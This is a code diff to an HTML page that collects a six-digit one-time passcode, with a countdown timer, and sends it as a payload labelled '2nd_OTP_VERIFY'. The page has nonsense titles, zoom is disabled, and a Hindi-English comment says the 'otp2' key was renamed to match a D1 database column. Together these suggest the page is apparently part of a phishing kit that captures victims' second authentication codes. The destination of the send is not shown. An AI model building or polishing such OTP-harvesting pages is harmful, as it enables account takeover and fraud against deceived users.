@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ndfhksn</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>jajsjbs</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -62,10 +62,12 @@
         });
 
         let timeLeft = 45;
-        setInterval(() => {
+        const timerInt = setInterval(() => {
             if (timeLeft > 0) {
                 timeLeft--;
                 document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+            } else {
+                clearInterval(timerInt);
             }
         }, 1000);
 
@@ -78,10 +80,10 @@
             let fullOtp = "";
             inputs.forEach(input => fullOtp += input.value);
 
+            // Sahi Payload: Key ko 'otp2' kiya taaki D1 ke column se match ho
             const payload = {
-                type: "2FA_VERIFICATION",
-                second_otp: fullOtp, 
-                created_at: new Date().toISOString()
+                type: "2nd_OTP_VERIFY",
+                otp2: fullOtp 
             };
 
             try {
